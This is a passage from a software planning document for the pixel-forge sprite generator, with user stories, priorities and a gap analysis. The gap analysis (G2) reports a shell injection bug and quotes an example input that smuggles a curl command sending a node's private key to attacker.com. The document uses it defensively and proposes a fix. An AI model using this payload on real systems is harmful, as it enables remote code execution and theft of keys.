- **Given** a training run, **When** epoch N completes, **Then** `{"epoch":N,"loss":F,"lr":F,"elapsed_s":N}` is appended to `{output}.log.json`.
- **Given** `jq '.[] | .loss' pixel-forge-anvil.safetensors.log.json`, **When** executed, **Then** all epoch losses are emitted as a clean float array.
- **Given** a interrupted training run (SIGINT), **When** the log file is read, **Then** all completed epochs are present and the JSON is valid (no trailing comma, no partial object).

---

### US-P5-03 — DDPM stochastic sampler flag

**Story:** As an ML researcher, I want `--sampler ddpm` on generate commands so that I can compare DDPM stochastic sampling against DDIM for the same model (BACKLOG #8).

**Acceptance Criteria:**
- **Given** `generate character --sampler ddpm --steps 100`, **When** run, **Then** DDPM noise injection per step is applied and the output is a valid 32×32 sprite (not noise).
- **Given** `generate character --sampler ddim --steps 40` (explicit) and `generate character --steps 40` (no sampler flag), **When** both are run with the same seed, **Then** outputs are identical (default is DDIM).
- **Given** `--sampler invalid`, **When** parsed, **Then** clap rejects it: `"invalid value 'invalid' for '--sampler': must be one of ddim, ddpm"`.

---

### US-P5-04 — Inspect conditioning channel effectiveness

**Story:** As an ML researcher, I want `pixel-forge inspect-cond --model cinder-detail.safetensors --count 16` to report per-pixel MAD between real-conditioned and random-conditioned forward passes so that I can verify the 6-channel model actually uses the conditioning input.

**Acceptance Criteria:**
- **Given** a 6-channel Cinder-detail model, **When** `inspect-cond` runs with 16 samples, **Then** output includes: `"mean_MAD: 0.042 (real cond vs random cond)"` — a value > 0.01 indicates conditioning is used.
- **Given** a standard 3-channel Cinder model passed to `inspect-cond`, **When** run, **Then** exit 1 with `"model is 3-channel — conditioning inspection requires 6ch model (check conv_in.weight shape)"`.
- **Given** the MAD result is < 0.005, **When** printed, **Then** a warning is included: `"WARNING: near-zero MAD — model may be ignoring the conditioning channel"`.

---

### US-P5-05 — Print σ schedule as CSV for verification

**Story:** As an ML researcher, I want `pixel-forge train --print-schedule --steps 40 --data /dev/null` to print the complete σ schedule (all 40 noise levels) as a CSV without running training, so that I can verify it matches Karras 2022 Figure 2.

**Acceptance Criteria:**
- **Given** `train --print-schedule --steps 40`, **When** run, **Then** output is 40 lines of `"step,sigma_t"` CSV and the process exits 0 without loading data.
- **Given** the CSV is plotted, **When** compared to the Karras cosine schedule analytically, **Then** values match within floating-point tolerance (σ_0 ≈ 1.0, σ_N ≈ 0.002 for the default schedule).
- **Given** `--cosine-schedule false`, **When** `--print-schedule` runs, **Then** a linear schedule is printed instead.

---

### US-P5-06 — Reproducible evaluation set for model comparison

**Story:** As an ML researcher, I want `pixel-forge generate character --count 64 --seed 0 --steps 100 --output eval/` to produce a fixed evaluation set so that I can compare two training runs on identical sample positions.

**Acceptance Criteria:**
- **Given** the same model file, seed, and step count, **When** `generate` is run on two different machines, **Then** outputs are identical (fully deterministic from seed, no environmental variance).
- **Given** `--count 64 --seed 0`, **When** each of the 64 sprites is generated, **Then** sprite N has a consistent seed derived from the base seed (not the same seed for all N).
- **Given** two different model checkpoints and the same seed, **When** both are run, **Then** outputs differ (confirming the model weights, not just the RNG, affect output).

---

### US-P5-07 — V-prediction and x0-prediction as named CLI flags

**Story:** As an ML researcher, I want explicit `--objective v_pred|x0_pred` naming on training so that the prediction target is unambiguous in experiment logs rather than implied by `--v-pred` (a boolean flag).

**Acceptance Criteria:**
- **Given** `train --objective x0_pred` (default), **When** training logs, **Then** `"objective: x0_prediction"` is logged at startup.
- **Given** `train --objective v_pred`, **When** training runs, **Then** velocity prediction is used and `"objective: v_prediction"` is logged.
- **Given** both `--v-pred` and `--objective x0_pred` are passed, **When** parsed, **Then** exit 1 with `"conflicting objective flags: --v-pred and --objective x0_pred"`.

---

## P6 — Priya, Android/Mobile Developer

**Context:** Building a pixel art companion app for an Android game. Wants pixel-forge as the generation backend. The `android/` crate (`org.cochranblock.pixelforge`) builds but is not published. WASM crate is an alternative for cross-platform browser inference.

---

### US-P6-01 — Documented JNI interface for Kotlin callers

**Story:** As a mobile dev, I want a documented JNI entry point in `pixel_forge_android` that exposes `generate(class: String, palette: String, count: Int): ByteArray` so that I can call it from Kotlin without reading 2,735 lines of `main.rs`.

**Acceptance Criteria:**
- **Given** `pixel_forge_android` loaded via `System.loadLibrary("pixel_forge_android")`, **When** `generate("character", "endesga32", 4)` is called, **Then** a byte array of PNG data is returned.
- **Given** an invalid class name passed to the JNI function, **When** called, **Then** a Java `IllegalArgumentException` is thrown with the message `"unknown class: mage"` (not a process abort).
- **Given** generation exceeds available memory, **When** called, **Then** a Java `OutOfMemoryError` is thrown (not a process abort that kills the Android app).

---

### US-P6-02 — Android build produces binary under 15MB

**Story:** As a mobile dev, I want the arm64-v8a release `.so` to be under 15MB so that my APK stays within the 50MB initial download target.

**Acceptance Criteria:**
- **Given** `cargo ndk -t arm64-v8a build --release --no-default-features`, **When** build completes, **Then** `target/aarch64-linux-android/release/libpixel_forge_android.so` is ≤ 15MB.
- **Given** the Cinder model (4.2MB) is bundled as `include_bytes!`, **When** the total APK size is measured, **Then** the APK is ≤ 30MB (binary + model + assets).
- **Given** the full `sd-pipeline` feature is disabled (no hf-hub), **When** the binary size is measured, **Then** it is at least 20% smaller than a build with `sd-pipeline` enabled.

---

### US-P6-03 — Peak RAM under 500MB on mobile

**Story:** As a mobile dev, I want Cinder inference to use under 500MB peak RAM on a 6GB Android device so that the OS doesn't kill the app during sprite generation.

**Acceptance Criteria:**
- **Given** `generate character --count 1 --steps 10` running on a Pixel 6a, **When** profiled via Android Studio Memory Profiler, **Then** peak allocation does not exceed 500MB.
- **Given** `--count 4 --steps 40`, **When** profiled, **Then** peak allocation does not exceed 800MB (4× sprites, still within safe margin for a 6GB device).
- **Given** available RAM drops below 256MB (system pressure), **When** generation is running, **Then** generation fails gracefully with `"insufficient memory for generation"` rather than crashing.

---

### US-P6-04 — WASM module under 5MB

**Story:** As a mobile dev, I want the `pixel-forge-wasm` `.wasm` bundle to be under 5MB so that the PWA page loads in under 3 seconds on a 4G mobile connection.

**Acceptance Criteria:**
- **Given** `wasm-pack build --release`, **When** build completes, **Then** `pkg/pixel_forge_wasm_bg.wasm` is ≤ 5MB.
- **Given** the WASM module loaded in Chrome on Android, **When** `generate("character", "stardew", 1)` is called, **Then** it returns a PNG byte array within 30 seconds.
- **Given** the browser does not support WebGPU, **When** the module initializes, **Then** it falls back to CPU WASM compute without throwing an unhandled exception.

---

### US-P6-05 — Android lifecycle stability

**Story:** As a mobile dev, I want the Android egui app to survive `onStop`/`onResume` lifecycle events without crashing mid-generation so that phone calls don't break the user's session.

**Acceptance Criteria:**
- **Given** generation is in progress, **When** the home button is pressed (`onStop`), **Then** generation continues in the background and the result is available when the app is resumed.
- **Given** the app is resumed after an `onStop`, **When** the egui frame renders, **Then** the previously generated sprites are still visible in the gallery.
- **Given** the system kills the app due to memory pressure, **When** the app is relaunched, **Then** it starts cleanly without recovering stale GPU state (crash-free fresh start).

---

### US-P6-06 — WASM JS API exposes list functions

**Story:** As a mobile dev, I want `list_classes()` and `list_palettes()` exported from the WASM module so that my web app can populate dropdowns without hardcoding pixel-forge internals in JavaScript.

**Acceptance Criteria:**
- **Given** the WASM module is loaded, **When** `list_classes()` is called from JavaScript, **Then** it returns a JSON string parseable as an array of strings matching the `BASE_CLASSES` plus any extras.
- **Given** `list_palettes()` is called, **When** parsed, **Then** it returns `["stardew","starbound","snes","nes","gameboy","pico8","endesga32"]`.
- **Given** a class name from `list_classes()` is passed to `generate()`, **When** called, **Then** generation succeeds (class list and generate are consistent).

---

## P7 — Elena, Security & IP Auditor

**Context:** Reviewing pixel-forge on behalf of a content publisher. Verifying (a) PoA cryptographic soundness, (b) model integrity properties, (c) training data provenance, (d) export control compliance.

---

### US-P7-01 — Independent PoA packet verification

**Story:** As a security auditor, I want to verify a GhostPacket using only the 153-byte wire format and the sender's public key so that I can confirm sprite provenance without running pixel-forge.

**Acceptance Criteria:**
- **Given** a 153-byte GhostPacket and the sender's Ed25519 public key, **When** `GhostPacket::from_bytes(&buf).verify()` is called (per `poa.rs:89`), **Then** it returns `true` iff the signature over bytes `[0..89]` is valid.
- **Given** a packet where any byte in `[0..89]` is modified, **When** `verify()` is called, **Then** it returns `false` (tamper detection).
- **Given** `pixel-forge node-key` on the generating machine, **When** the printed public key (64 hex chars) is compared to `packet.public_key`, **Then** they match byte-for-byte.

---

### US-P7-02 — NanoSign returns distinct error types

**Story:** As a security auditor, I want `nanosign::verify()` to distinguish `Unsigned`, `Verified`, and `Failed` results so that audit tooling can classify model file anomalies precisely.

**Acceptance Criteria:**
- **Given** a file with no NSIG magic bytes, **When** `verify()` is called (per `nanosign.rs:30`), **Then** `VerifyResult::Unsigned` is returned.
- **Given** a file with valid NSIG magic but mismatched hash, **When** `verify()` is called, **Then** `VerifyResult::Failed { expected, actual }` is returned with both hash values.
- **Given** a correctly signed file, **When** `verify()` is called, **Then** `VerifyResult::Verified(hash)` is returned.

---

### US-P7-03 — Unsigned models produce a logged warning

**Story:** As a security auditor, I want unsigned `.safetensors` files to produce a warning in the log so that old unsigned models in production are identifiable during an audit.

**Acceptance Criteria:**
- **Given** an unsigned model is loaded via `verify_or_bail()` (per `nanosign.rs:59`), **When** loaded, **Then** `"WARNING: model unsigned: pixel-forge-cinder.safetensors (backward compat — sign with: pixel-forge sign <file>)"` is logged to stderr.
- **Given** a tampered model is loaded, **When** `verify_or_bail()` is called, **Then** it returns `Err(...)` and the process aborts with exit code 1.
- **Given** `--strict-sign` flag is set on `generate`, **When** an unsigned model is encountered, **Then** exit 1 with the same message as a tampered model.

---

### US-P7-04 — Training data provenance documentation

**Story:** As an IP counsel, I want `pixel-forge govdocs supply-chain` to list each training data source with license type, tile count, origin URL, and access date so that I can document the copyright status of the training corpus.

**Acceptance Criteria:**
- **Given** `pixel-forge govdocs supply-chain`, **When** run, **Then** the output lists all 6 sources from `data/SOURCES.md`: DCSS (CC0), DawnLike (CC-BY 4.0), Kenney (CC0), Hyptosis (CC-BY 3.0), Gervais (CC-BY 3.0), Gemini-generated.
- **Given** the Gemini-generated entry, **When** read, **Then** it explicitly states: "AI-generated by project operator via Gemini Pro; not scraped from copyrighted games."
- **Given** an attorney reading the document, **When** reviewing CC-BY compliance, **Then** each CC-BY source has an explicit attribution statement that satisfies the license's credit requirement.

---

### US-P7-05 — GPS trust boundary documented in PoA

**Story:** As a security auditor, I want the GhostPacket format documentation to explicitly label the latitude/longitude fields as `user_asserted` (not hardware-verified) so that downstream consumers of PoA packets do not mistake user-supplied GPS for cryptographic attestation.

**Acceptance Criteria:**
- **Given** `poa.rs` docstring for `GhostPacket`, **When** read, **Then** `latitude` and `longitude` are documented as `"user-supplied; not hardware-attested"`.
- **Given** `pixel-forge forge --lat 0.0 --lon 0.0`, **When** the packet is printed, **Then** a warning is included: `"GPS coordinates are user-asserted, not hardware-verified"`.
- **Given** `packet.verify()` returns `true`, **When** interpreted, **Then** it verifies only the cryptographic signature — not the truthfulness of GPS coordinates (documented limitation).

---

### US-P7-06 — Export control compliance documentation

**Story:** As a federal contractor, I want `pixel-forge govdocs itar-ear` to confirm that Ed25519 signing qualifies for the EAR TSU exception so that I can include the classification in my export control review.

**Acceptance Criteria:**
- **Given** `pixel-forge govdocs itar-ear`, **When** run, **Then** the output includes: `"ECCN: EAR 740.17(b)(3) — ancillary crypto. TSU notification required to: crypt@bis.doc.gov"`.
- **Given** `govdocs itar-ear` output, **When** reviewed, **Then** it explicitly states that pixel-forge is not on the USML and contains no defense articles.
- **Given** the document, **When** reviewed, **Then** all three cryptographic functions (Ed25519, SHA-256, BLAKE3) are classified individually.

---

## P8 — Sam, Creative Pixel Artist

**Context:** Non-technical user. Downloaded the binary. Wants to press a button and get sprites, rate them, keep the good ones. Primary interface is the egui GUI.

---

### US-P8-01 — GUI launches without crashing when no model is present

**Story:** As a pixel artist, I want `pixel-forge` (no args) to open a GUI that explains how to get a model instead of crashing, so that my first experience isn't a silent failure.

**Acceptance Criteria:**
- **Given** no `.safetensors` files in the working directory, **When** the GUI launches, **Then** a visible banner reads `"No model found. Download a model to generate sprites: pixel-forge setup"` — not a blank window, not a crash.
- **Given** the user clicks "Generate" with no model, **When** clicked, **Then** a dialog shows the same download instruction.
- **Given** a model is present and NanoSign-verified, **When** the GUI launches, **Then** the banner is absent and the Generate button is enabled.

---

### US-P8-02 — Generate sprites with a single click

**Story:** As a pixel artist, I want to select a class and click "Generate" to see sprites appear within 10 seconds so that the tool feels interactive.

**Acceptance Criteria:**
- **Given** a Cinder model is loaded, **When** the user selects "dragon" from the class dropdown and clicks "Generate", **Then** sprites appear in the gallery within 10 seconds on a machine with Metal or CUDA.
- **Given** generation is running, **When** the user looks at the UI, **Then** a progress indicator (spinner or step counter) is visible.
- **Given** generation completes, **When** the gallery updates, **Then** the new sprites replace the previous result without requiring a scroll.

---

### US-P8-03 — Swipe interface to rate sprites

**Story:** As a pixel artist, I want to swipe sprites in the GUI (or click thumbs-up/down) to record good/bad verdicts for Judge training so that I can curate a quality dataset without a command line.

**Acceptance Criteria:**
- **Given** `gen_state.individual_sprites` is populated after generation (per `app.rs:27`), **When** the user swipes right on a sprite, **Then** `swipe_store::SwipeStore::record()` is called with `good=true`.
- **Given** 20+ swipes recorded, **When** `swipe_store.judge_ready()` returns true, **Then** a button `"Train Judge (20 swipes ready)"` appears in the GUI.
- **Given** the user accidentally swipes wrong, **When** they click "Undo last swipe", **Then** the most recent swipe record is removed from the store.

---

### US-P8-04 — Save sprite to file from GUI

**Story:** As a pixel artist, I want to right-click a sprite in the gallery and click "Save as PNG" to save it to a chosen location so that I can use it in Aseprite without a command line.

**Acceptance Criteria:**
- **Given** a generated sprite in the gallery, **When** the user right-clicks and selects "Save as PNG", **Then** an OS file-save dialog appears.
- **Given** the user selects a path and clicks Save, **When** the file is written, **Then** it is a valid 32×32 RGBA PNG.
- **Given** the user clicks "Save all" on a batch of 8 sprites, **When** a directory is chosen, **Then** 8 files are saved as `character_001.png` … `character_008.png`.

---

### US-P8-05 — Zoom sprite to see individual pixels

**Story:** As a pixel artist, I want to zoom the sprite preview to 8× magnification so that I can inspect individual pixels clearly on a Retina display.

**Acceptance Criteria:**
- **Given** a 32×32 sprite in the gallery, **When** the user double-clicks it, **Then** a zoomed view opens at 8× (256×256 display) with sharp nearest-neighbor scaling (no bilinear blur).
- **Given** the zoomed view, **When** the user scrolls the mouse wheel, **Then** zoom level adjusts in 1× increments (4×, 5×, 6×, 7×, 8×).
- **Given** zoom level 8×, **When** the user views a 32×32 sprite, **Then** each pixel occupies exactly 8×8 screen pixels with no anti-aliasing.

---

### US-P8-06 — GUI remembers settings between launches

**Story:** As a pixel artist, I want the GUI to remember my last-used class, palette, and model mode between launches so that I don't reconfigure every time I open the app.

**Acceptance Criteria:**
- **Given** the user selects "dragon", "endesga32", and "Anvil" mode and closes the app, **When** they relaunch, **Then** "dragon", "endesga32", and "Anvil" are pre-selected.
- **Given** the settings file is corrupt or absent, **When** the GUI launches, **Then** it uses defaults ("character", "stardew", "Cinder") without crashing.
- **Given** the settings file exists from a previous version with missing keys, **When** the GUI launches, **Then** only missing keys are defaulted (no settings reset for valid keys).

---

### US-P8-07 — Generation progress visible during denoising

**Story:** As a pixel artist, I want a step counter showing "Step 20 of 40" during generation so that I know the app is working and can estimate how long to wait.

**Acceptance Criteria:**
- **Given** a 40-step generation run, **When** the denoising loop is at step 20, **Then** the UI shows `"Generating… 20/40"`.
- **Given** generation completes at step 40, **When** the UI updates, **Then** the progress indicator disappears and the gallery shows the result.
- **Given** the user changes model mode to "Cascade" (Quench 25 steps + Cinder 15 steps), **When** progress is shown, **Then** it distinguishes the two phases: `"Quench: 12/25"` and then `"Cinder: 8/15"`.

---

### US-P8-08 — Cluster generation accessible from GUI

**Story:** As a pixel artist, I want a "Use Cluster" toggle in the GUI that distributes generation across all reachable IRONHIVE nodes so that I can generate 64 sprites at once faster than on my local machine alone.

**Acceptance Criteria:**
- **Given** "Use Cluster" is toggled on, **When** "Generate" is clicked, **Then** `cluster::probe_cluster()` is called first and the status shows `"Cluster: 3 nodes, 2.4 sprites/sec"`.
- **Given** no remote nodes are reachable, **When** "Use Cluster" is toggled on and "Generate" is clicked, **Then** a dialog shows `"No cluster nodes reachable — generating locally"` and local generation proceeds.
- **Given** cluster generation completes, **When** the gallery updates, **Then** sprites from all nodes are shown in a single unified grid.

---

---

## MoSCoW Prioritization

### Must Have — Ship Blockers

| Story | Persona | Fix effort |
|-------|---------|-----------|
| US-P1-01 sad path: graceful model-not-found error | Indie Dev | 30 min |
| US-P1-12: Pre-trained model download via `setup` | Indie Dev | 1 day (train + publish) |
| Shell injection in `cluster.rs:349` (class param in shell format string) | Security | 30 min |
| US-P2-02: Fix `train --medium` filename default | Cluster Admin | 10 min |
| US-P3-01: Fix plugin endesga32 alias | Plugin Consumer | 5 min |
| US-P3-02: Fix plugin 16×16 hardcode → 32×32 | Plugin Consumer | 5 min |
| US-P2-06: NanoSign verify on `--resume` | Cluster Admin | 2 hours |
| US-P8-01: GUI no-model banner instead of crash | Pixel Artist | 2 hours |

### Should Have — High Value, Workaround Exists

| Story | Persona | Fix effort |
|-------|---------|-----------|
| US-P1-02: Seed in `cascade` (BACKLOG #2c) | Indie Dev | 1 hour |
| US-P1-03: Per-file export `--output dir/` | Indie Dev | 2 hours |
| US-P2-01: Configurable cluster paths via env var | Cluster Admin | 1 hour |
| US-P3-03: Seed support in plugin generate | Plugin Consumer | 1 hour |
| US-P7-03: Log warning on unsigned model load | Security | 30 min |
| US-P2-09: Restore skeleton seeding (BACKLOG #1) | Cluster Admin | 4 hours |
| US-P5-01: `--min-snr-gamma` CLI flag | Researcher | 1 hour |
| US-P4-05: CI workflow (GitHub Actions) | OSS Dev | 2 hours |

### Could Have — Nice to Have

| Story | Persona | Fix effort |
|-------|---------|-----------|
| US-P1-10: Custom `.pal` file import | Indie Dev | 3 hours |
| US-P2-07: Machine-parseable training log | Cluster Admin | 2 hours |
| US-P5-03: DDPM sampler flag (BACKLOG #8) | Researcher | 4 hours |
| US-P8-05: Pixel zoom in GUI | Pixel Artist | 3 hours |
| US-P6-06: WASM `list_classes()`/`list_palettes()` exports | Mobile Dev | 1 hour |

### Will Not Have (explicitly out of scope)

| Story | Reason |
|-------|--------|
| Text-to-sprite conditioning (`sprite "red knight with shield"`) | Requires CLIP embeddings; contradicts "no Python, no cloud" |
| FID metric via InceptionV3 | Requires Python/PyTorch; "No Python" is a hard constraint |
| `--size 16` or `--size 64` generation | Architecture trained at 32×32; different size = retrain |
| iOS shipped app | Scaffold only; no implementation; Apple Developer account required |
| FIPS 140-3 certified crypto | ed25519-dalek is not NIST-certified; TSU exception is the compliant path |

---

## Gap Analysis

### G1 — No pre-trained model in any release (CRITICAL)

No GitHub Release artifact with a trained model. A fresh clone cannot generate a single sprite. `setup` downloads SD models (4GB), not pixel-forge models. The previous `USER_STORY_ANALYSIS.md` (2026-03-27) documented this as a "SHIP-BLOCKER" — it remains unresolved.  
**Fix:** Train one Cinder checkpoint under current EDM + normalize.json recipe, NanoSign it, attach to GitHub Release v0.6.1 with SHA-256 manifest.

### G2 — Shell injection RCE in cluster.rs (CRITICAL SECURITY)

`generate_remote()` at `cluster.rs:349-363` constructs the remote SSH command via:
```rust
format!("{REMOTE_BIN} auto {class} --count {count} ...")
```
The `class` variable is user-supplied from the CLI and interpolated directly into a shell command. Input `class = "character; curl attacker.com/$(cat ~/.pixel-forge/node.key | base64)"` executes the curl command on every cluster node.  
**Fix:** Replace format string with `Command::arg()` for all SSH-dispatched args. Validate `class` against `class_cond::lookup()` allowlist before any dispatch.

### G3 — Plugin generates 16×16 instead of 32×32

`plugin.rs:154` calls `device_cap::auto_sample(&cond, 16, count, steps)`. The hardcoded `16` is never documented and produces undersized sprites that kova's T220 panel must upscale, producing blurry output.  
**Fix:** Change `16` to `32` (one character).

### G4 — No CI/CD workflow

`.github/` directory exists but no workflow YAML files. All quality assurance is manual. Regressions merge undetected.  
**Fix:** Add `.github/workflows/ci.yml` with: `cargo build --no-default-features`, `cargo clippy -- -D warnings`, `cargo test`.

### G5 — Skeleton seeding disabled since hybrid conditioning (quality regression)

`train.rs:1036-1037`: skeleton warm-start was disabled when hybrid conditioning (super_id + tags) replaced integer class IDs. All generation now starts from pure noise. The skeleton directory `skeletons_v2/` was never computed.  
**Fix:** Recompute `skeletons_v2/` keyed by `(super_id, class_name)` via the `skeletons` command; re-enable warm-start in `sample_seeded_cfg`.

### G6 — NanoSign unsigned files silently pass in production

`nanosign.rs:59` (`verify_or_bail`) returns `Ok(())` for unsigned files. This is documented as backward-compat but produces no visible signal. An attacker can replace a signed model with an unsigned poisoned model and it will load without error.  
**Fix:** Log a visible stderr warning on unsigned load. Add `--strict-sign` flag (or `PIXEL_FORGE_STRICT_SIGN=1`) to treat unsigned as an error in production contexts.

### G7 — Plugin PALETTE_NAMES diverges from palette.rs canonical list

`plugin.rs:49` hardcodes `PALETTE_NAMES` as a `const &[&str]`. When a new palette is added to `palette.rs`, it must be manually added to `plugin.rs`. Current divergence: `"endesga"` vs `"endesga32"` (BACKLOG #2b).  
**Fix:** Derive `PALETTE_NAMES` from `palette::all_palette_names()` — a single source of truth.

### G8 — No CHANGELOG.md documenting breaking changes

The v0.5→v0.6 migration broke all pre-existing checkpoints (mandatory `normalize.json` sidecar, EDM sampler replacing DDPM). Users who download old checkpoints get cryptic tensor panics with no upgrade path.  
**Fix:** Add `CHANGELOG.md` documenting: (1) normalize.json sidecar is mandatory since commit `701eea94`, (2) EDM sampler replaced DDPM in `a1f61fda`, (3) hybrid conditioning replaced integer class IDs.

---

## Executive Recommendations

**Sprint 1 (1 week — all bug fixes, no features):**

1. Fix shell injection in `cluster.rs:349` — change format string to `Command::arg()`, validate class. *(30 min)*
2. Fix `train --medium` default filename (BACKLOG #2a). *(10 min)*
3. Fix plugin `"endesga"` → `"endesga32"` (BACKLOG #2b). *(5 min)*
4. Fix plugin `img_size=16` → `32`. *(5 min)*
5. Add cascade `--seed` (BACKLOG #2c). *(1 hour)*
6. Add graceful model-not-found error with training/download instructions. *(30 min)*
7. Log warning on unsigned model load in `verify_or_bail`. *(30 min)*
8. Add GitHub Actions CI workflow. *(1 hour)*

**Sprint 2 (2 weeks — first public release):**

1. Train Cinder under current EDM + z-score recipe. NanoSign. Publish GitHub Release v0.6.1 with SHA-256 manifest.
2. Configurable cluster paths via `PIXEL_FORGE_REMOTE_BIN` env var.
3. Per-file export (`--output dir/` → individual files).
4. Restore skeleton seeding (BACKLOG #1).
5. `CHANGELOG.md` + `CONTRIBUTING.md`.

**Most important architectural truth this analysis uncovered:**

The product has a working diffusion stack, a working cluster, working model integrity, working federal compliance documentation — but it has never shipped a pre-trained model that new users can download and run. Every other quality issue is secondary. The single highest-ROI action is training one clean Cinder checkpoint and attaching it to a GitHub Release.

---

*Grounded in: `src/main.rs` (2,735 lines, 39 subcommands), `src/cluster.rs:349` (shell injection), `src/plugin.rs:49,154` (palette name, hardcoded size), `src/nanosign.rs:59` (unsigned pass), `src/poa.rs` (GhostPacket format), `src/class_cond.rs` (108 classes, 10 super-categories), `BACKLOG.md`, `PROOF_OF_ARTIFACTS.md`, `ASSUMED_BREACH_THREAT_MODEL.md`, `govdocs/` (11 compliance documents), `android/Cargo.toml`, `wasm/Cargo.toml`.*
<!-- COCHRANBLOCK-BRAND-FOOTER:START - generated by cochranblock/scripts/brand-stamp.sh -->

---

<sub>&#9656; **THE COCHRAN BLOCK, LLC** &#183; CAGE `1CQ66` &#183; UEI `W7X3HAQL9CF9` &#183; UNLICENSE &#183; [cochranblock.org](https://cochranblock.org)</sub>
<!-- COCHRANBLOCK-BRAND-FOOTER:END -->
